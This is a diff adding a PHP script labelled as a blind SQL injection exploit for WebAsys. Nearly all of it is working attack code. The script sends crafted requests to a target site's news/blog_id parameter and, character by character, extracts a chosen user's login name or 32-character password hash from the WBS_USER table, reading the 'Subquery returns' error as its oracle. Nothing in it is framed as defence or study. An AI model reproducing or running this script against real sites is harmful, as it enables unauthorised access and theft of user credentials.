@@ -1,0 +1,55 @@
+<?php
+/**
+ * WebAsys blindSQL-inj exploit
+ * @author: zsh.shell
+ */
+
+if($argc !== 4) {
+ echo "#######################################\n\n";
+ echo "GET username by id:\tphp ".$argv[0]." url id u\n";
+ echo "GET password by id:\tphp ".$argv[0]." url id p\n";
+ echo "\nExample: php ".$argv[0]." http://site.com/ 1 p\n\n";
+ die("#######################################\n");
+}
+$url = $argv[1]."index.php?ukey=news&blog_id=";
+$id = $argv[2];
+$me = $argv[3];
+if($me == 'u') {
+        $me = "lower(U_ID)";
+        $chars = Array(0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z);
+
+	for($i=1;$i<=25;$i++) {
+		$vuln = $url."if((select+length(U_ID)+FROM+WBS_USER+where+C_ID=1)=".$i.",1,(select+1+union+select+2))";
+		$result = file_get_contents($vuln);
+		if(!preg_match("/Subquery returns/", $result)) {
+			$much = $i;
+			break;
+		}
+	 }
+}
+elseif($me == 'p') {
+	$me = "U_PASSWORD";
+	$chars = Array(0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f);
+	$much = 32;
+}
+else die("Wrong exploit parametr". $me ."\n");
+
+$chars = array_map("ord", $chars);
+
+
+for($i=1;$i<=$much;$i++)
+	foreach($chars as $j) {
+		for($k=0;$k<=strlen($out);$k++) echo chr(8);
+		$vuln = $url."if(ascii(substring((select+".$me."+from+WBS_USER+where+C_ID=".$id."),".$i.",1))=".$j.",1,(select+1+union+select+2))";
+		$result = file_get_contents($vuln);
+		$out = "[".chr($j)."] :> ".$res;
+		
+		if(!preg_match("/Subquery returns/", $result)) {
+			$res .= chr($j);
+			break;
+		}
+		echo $out;
+	}
+if(substr(strtolower(PHP_OS),0,3) == 'win') system("cls"); else system("clear");
+echo "[+] Result:\t".$res."\n";
+?>
